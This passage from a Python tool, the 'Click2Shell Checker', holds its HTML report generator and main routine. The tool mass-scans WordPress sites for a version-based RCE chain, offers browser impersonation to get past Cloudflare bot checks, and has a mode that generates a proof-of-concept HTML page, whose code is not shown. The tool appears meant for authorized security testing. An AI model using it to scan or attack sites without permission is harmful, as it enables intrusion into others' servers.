  thead th { text-align: left; font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.05em; color: var(--muted); padding: 0.7rem 0.9rem; border-bottom: 1px solid var(--border); background: #fbfbfc; cursor: pointer; user-select: none; white-space: nowrap; }
  thead th:hover { color: var(--text); }
  thead th .arrow { color: var(--blue); margin-left: 0.25rem; }
  tbody td { padding: 0.7rem 0.9rem; border-bottom: 1px solid var(--border); font-size: 0.9rem; }
  tbody tr:last-child td { border-bottom: 0; }
  tbody tr:hover { background: #fafbfc; }
  td.target { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.85rem; }
  .badge { display: inline-block; padding: 0.15rem 0.55rem; border-radius: 999px; font-size: 0.72rem; font-weight: 600; letter-spacing: 0.02em; }
  .b-vuln { background: #fef2f2; color: var(--red); }
  .b-rce { background: var(--darkred); color: #fff; }
  .b-ok { background: #ecfdf5; color: var(--green); }
  .b-open { background: #fffbeb; color: var(--amber); }
  .b-none { background: #f3f4f6; color: var(--muted); }
  .b-err { background: #fef2f2; color: var(--red); }
  .b-offline { background: #f1f5f9; color: var(--slate); }
  .muted { color: var(--muted); }
  footer { margin-top: 1.75rem; color: var(--muted); font-size: 0.78rem; }
"""

# Client-side table sorting (self-contained, no external libraries).
SORT_TABLE_JS = """
function sortTable(col) {
  var table = document.getElementById('results');
  if (!table) return;
  var tbody = table.tBodies[0];
  var rows = Array.prototype.slice.call(tbody.rows);
  var asc = (table.dataset.col == col) ? !(table.dataset.asc == 'true') : true;
  rows.sort(function(a, b) {
    var x = a.cells[col].textContent.trim();
    var y = b.cells[col].textContent.trim();
    return x.localeCompare(y, undefined, {numeric: true, sensitivity: 'base'});
  });
  if (!asc) rows.reverse();
  rows.forEach(function(r) { tbody.appendChild(r); });
  table.dataset.col = col;
  table.dataset.asc = asc;
  var ths = table.querySelectorAll('thead th');
  ths.forEach(function(th, i) {
    var label = th.getAttribute('data-label') || th.textContent;
    th.innerHTML = label + (i === col ? '<span class="arrow">' + (asc ? '▲' : '▼') + '</span>' : '');
  });
}
"""


def generate_html_report(
    results: list,
    out_path: str,
    stats: Optional[dict] = None,
    skipped: Optional[list] = None,
):
    """Write a self-contained, minimalist HTML report."""
    stats = stats or {}
    n_wp = sum(1 for d in results if d.is_wordpress)
    n_vuln = sum(1 for d in results if d.vulnerable_click2shell)
    n_mrz = sum(1 for d in results if d.chain_theme_installed)
    n_blocked = sum(1 for d in results if d.blocked)
    n_offline = sum(1 for d in results if d.offline)

    def esc(s):
        return html_lib.escape(str(s)) if s is not None else ""

    rows = []
    for d in results:
        if d.error:
            status = '<span class="badge b-err">ERROR</span>'
        elif d.blocked:
            status = '<span class="badge b-open">BLOCKED</span>'
        elif d.offline:
            status = '<span class="badge b-offline">OFFLINE</span>'
        elif d.vulnerable_click2shell:
            status = '<span class="badge b-vuln">VULNERABLE</span>'
        elif d.is_wordpress and d.version:
            status = '<span class="badge b-ok">patched</span>'
        elif d.is_wordpress:
            status = '<span class="badge b-open">UNKNOWN</span>'
        else:
            status = '<span class="badge b-none">n/a</span>'

        wp = "?" if (d.blocked or d.offline) else ("yes" if d.is_wordpress else "no")
        mrz = (
            '<span class="badge b-open">installed</span>'
            if d.chain_theme_installed
            else '<span class="muted">-</span>'
        )
        setup = (
            '<span class="badge b-open">OPEN</span>'
            if d.setup_exposed
            else '<span class="muted">-</span>'
        )
        version = esc(d.version or "-")
        if d.version:
            version = f"<strong>{version}</strong>"
        rows.append(
            f"<tr><td class='target'>{esc(d.target)}</td>"
            f"<td>{esc(wp)}</td>"
            f"<td>{version}</td><td>{status}</td><td>{mrz}</td>"
            f"<td>{setup}</td><td class='muted'>{esc(d.version_source or '-')}</td></tr>"
        )

    skipped_rows = ""
    if skipped:
        items = "".join(
            f"<li>{esc(raw)} <span class='muted'>→ {esc(reason)}</span></li>"
            for raw, reason in skipped
        )
        skipped_rows = (
            f"<h2 style='margin:2rem 0 0.6rem;font-size:1.05rem'>Filtered / duplicates "
            f"({len(skipped)})</h2>"
            f"<div class='card'><ul style='list-style:none;font-size:0.85rem'>{items}</ul></div>"
        )

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    baseline = ".".join(map(str, FIXED_VERSION))
    html = f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Click2Shell Report</title>
<style>{HTML_REPORT_CSS}</style>
</head>
<body>
<div class="wrap">
  <header>
    <p class="author">CronUp Cybersecurity</p>
    <h1>Click2Shell Report</h1>
    <p class="meta">Generated {esc(now)} &middot; Baseline <code>WordPress &lt; {esc(baseline)}</code> vulnerable</p>
  </header>

  <section class="summary">
    <div class="card blue"><div class="num">{len(results)}</div><div class="lbl">Targets</div></div>
    <div class="card blue"><div class="num">{n_wp}</div><div class="lbl">WordPress</div></div>
    <div class="card red"><div class="num">{n_vuln}</div><div class="lbl">Vulnerable (RCE chain)</div></div>
    <div class="card darkred"><div class="num">{n_mrz}</div><div class="lbl">MRZ theme installed</div></div>
    <div class="card amber"><div class="num">{n_blocked}</div><div class="lbl">Blocked</div></div>
    <div class="card slate"><div class="num">{n_offline}</div><div class="lbl">Offline</div></div>
  </section>

  <table id="results">
    <thead><tr>
      <th data-label="Target" onclick="sortTable(0)">Target</th>
      <th data-label="WP" onclick="sortTable(1)">WP</th>
      <th data-label="Version" onclick="sortTable(2)">Version</th>
      <th data-label="Status" onclick="sortTable(3)">Status</th>
      <th data-label="MRZ theme" onclick="sortTable(4)">MRZ theme</th>
      <th data-label="Setup" onclick="sortTable(5)">Setup</th>
      <th data-label="Source" onclick="sortTable(6)">Source</th>
    </tr></thead>
    <tbody>{"".join(rows)}</tbody>
  </table>
  {skipped_rows}

  <footer>Click2Shell Checker &middot; CronUp Cybersecurity &middot; Authorized use only &middot; Passive WordPress version detection.</footer>
</div>
<script>{SORT_TABLE_JS}</script>
</body>
</html>"""
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html)
    return out_path


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
def main():
    global POLITE_DELAY, USE_COLOR

    ap = argparse.ArgumentParser(
        description="Click2Shell (WordPress < 7.1.1) non-invasive checker + PoC generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python click2shell_checker.py -l targets.txt\n"
            "  python click2shell_checker.py -t https://example.com --json out.json\n"
            "  python click2shell_checker.py -l targets.txt --poc example.com --poc-out poc.html\n"
        ),
    )
    src = ap.add_mutually_exclusive_group()
    src.add_argument("-t", "--target", help="Single target URL")
    src.add_argument("-l", "--list", help="File with one target per line")

    ap.add_argument(
        "--threads", type=int, default=10, help="Concurrent workers (default 10)"
    )
    ap.add_argument(
        "--timeout", type=int, default=REQUEST_TIMEOUT, help="HTTP timeout seconds"
    )
    ap.add_argument(
        "--delay",
        type=float,
        default=POLITE_DELAY,
        help="Per-request courtesy delay seconds",
    )
    ap.add_argument(
        "--insecure", action="store_true", help="Ignore TLS certificate errors"
    )
    ap.add_argument(
        "--impersonate",
        action="store_true",
        help="Impersonate a Chrome browser via curl_cffi to reduce Cloudflare bot challenges",
    )
    ap.add_argument(
        "--no-chain",
        action="store_true",
        help="Skip mobile-repair-zone theme detection",
    )
    ap.add_argument("--json", metavar="FILE", help="Write results as JSON")
    ap.add_argument("--csv", metavar="FILE", help="Write results as CSV")
    ap.add_argument("--html", metavar="FILE", help="Write a minimalist HTML report")
    ap.add_argument(
        "--prefer-https",
        action="store_true",
        help="When a host appears with http+https, keep the https entry",
    )
    ap.add_argument(
        "--no-color", action="store_true", help="Disable ANSI colors in console output"
    )

    ap.add_argument("--poc", metavar="TARGET", help="Generate PoC HTML for a target")
    ap.add_argument("--poc-out", default="click2shell_poc.html", help="PoC output path")
    ap.add_argument(
        "--poc-delay", type=int, default=60000, help="Stage-2 delay ms (default 60000)"
    )
    ap.add_argument(
        "--poc-theme",
        default=CHAIN_THEME,
        help="Theme slug for PoC (default mobile-repair-zone)",
    )

    args = ap.parse_args()

    if not (args.target or args.list or args.poc):
        ap.error("one of -t/--target, -l/--list, or --poc is required")

    POLITE_DELAY = args.delay
    verify = not args.insecure

    # Console colors (cross-platform via colorama, auto-off when piped)
    if _COLORAMA:
        just_fix_windows_console()
    USE_COLOR = (not args.no_color) and sys.stdout.isatty()

    # PoC-only mode
    if args.poc:
        out = generate_poc(args.poc, args.poc_out, args.poc_delay, args.poc_theme)
        print(f"[+] PoC written to {out}")
        print(
            "[!] The full RCE chain requires an AUTHENTICATED ADMIN to open the page."
        )
        print("[!] Use only on systems you own or are authorized to test.")
        return

    # Gather + clean + validate + dedupe targets
    if args.target:
        raw_entries = [args.target]
    else:
        with open(args.list, "r", encoding="utf-8") as f:
            raw_entries = f.read().splitlines()

    targets, tstats = load_targets(raw_entries, args.prefer_https)

    if not targets:
        sys.exit(red("[!] No valid targets supplied."))

    baseline = ".".join(map(str, FIXED_VERSION))
    print(
        bold(f"[*] Scanning {len(targets)} target(s)")
        + dim(" - non-invasive passive checks only.")
    )
    print(
        bold("[*] Fixed version baseline: ")
        + yellow(baseline)
        + dim(f" (WordPress {baseline}) - versions < {baseline} are vulnerable")
    )

    # Input-cleaning report (file mode only)
    if args.list:
        print(
            dim(
                f"[*] Input: {tstats['total']} line(s) -> {tstats['valid']} valid, "
                f"{tstats['invalid']} invalid, {tstats['duplicates']} duplicate(s) removed."
            )
        )
        for raw, reason in tstats["skipped"]:
            if reason == "invalid host/URL":
                print(yellow(f"    [!] skipped: {raw!r} ({reason})"))

    results = []
    total = len(targets)
    show_progress = sys.stdout.isatty() and not args.no_color
    if show_progress and total > 1:
        print()  # fresh line for the live progress bar
    done = 0
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {
            ex.submit(
                scan_target,
                t,
                verify,
                args.timeout,
                not args.no_chain,
                args.impersonate,
            ): t
            for t in targets
        }
        for fut in as_completed(futs):
            try:
                results.append(fut.result())
            except Exception as e:  # noqa: BLE001
                results.append(Detection(target=futs[fut], error=str(e)))
            done += 1
            if show_progress and total > 1:
                print(f"\r{render_progress(done, total)}", end="", flush=True)
    if show_progress and total > 1:
        print()  # close the progress line before the results table

    # sort back to input order
    order = {t: i for i, t in enumerate(targets)}
    results.sort(key=lambda d: order.get(d.target, 9999))

    print_table(results)

    # summary
    vuln = [d for d in results if d.vulnerable_click2shell]
    mrz = [d for d in results if d.chain_theme_installed]
    wp = [d for d in results if d.is_wordpress]
    setup = [d for d in results if d.setup_exposed]
    blocked = [d for d in results if d.blocked]
    offline = [d for d in results if d.offline]
    print(
        "\n"
        + bold(f"[+] WordPress sites: {green(str(len(wp)))}")
        + " | "
        + bold(f"Vulnerable (RCE-chainable): {red(str(len(vuln)))}")
        + " | "
        + bold(f"MRZ theme installed: {magenta(str(len(mrz)))}")
        + " | "
        + bold(f"Setup open: {yellow(str(len(setup)))}")
        + " | "
        + bold(f"Blocked: {yellow(str(len(blocked)))}")
        + " | "
        + bold(f"Offline: {magenta(str(len(offline)))}")
    )
    if vuln:
        print(
            dim(
                "[!] VULNERABLE = forced theme-install primitive (High) that chains "
                "to RCE (Critical). 'MRZ installed' = chain ready locally; if absent, "
                "the core bug downloads the vulnerable theme from the catalog."
            )
        )
    if blocked or offline:
        print(
            dim(
                "[!] BLOCKED = bot/WAF challenge (Cloudflare etc.) hid the site; "
                "OFFLINE = unreachable. Re-run those manually or with --insecure."
            )
        )

    # exports
    if args.json:
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump(
                {
                    "generated": datetime.now(timezone.utc).isoformat(),
                    "baseline": "WordPress 7.1.1",
                    "results": [d.to_dict() for d in results],
                },
                f,
                indent=2,
            )
        print(green(f"[+] JSON written to {args.json}"))

    if args.csv:
        with open(args.csv, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(
                f,
                fieldnames=[
                    "target",
                    "is_wordpress",
                    "version",
                    "version_source",
                    "vulnerable_click2shell",
                    "chain_theme_installed",
                    "chain_theme_version",
                    "setup_exposed",
                    "blocked",
                    "offline",
                    "http_status",
                    "error",
                ],
            )
            w.writeheader()
            for d in results:
                w.writerow({k: d.to_dict()[k] for k in w.fieldnames})
        print(green(f"[+] CSV written to {args.csv}"))

    if args.html:
        out = generate_html_report(
            results,
            args.html,
            stats=tstats,
            skipped=tstats["skipped"] if args.list else None,
        )
        print(green(f"[+] HTML report written to {out}"))


if __name__ == "__main__":
    main()
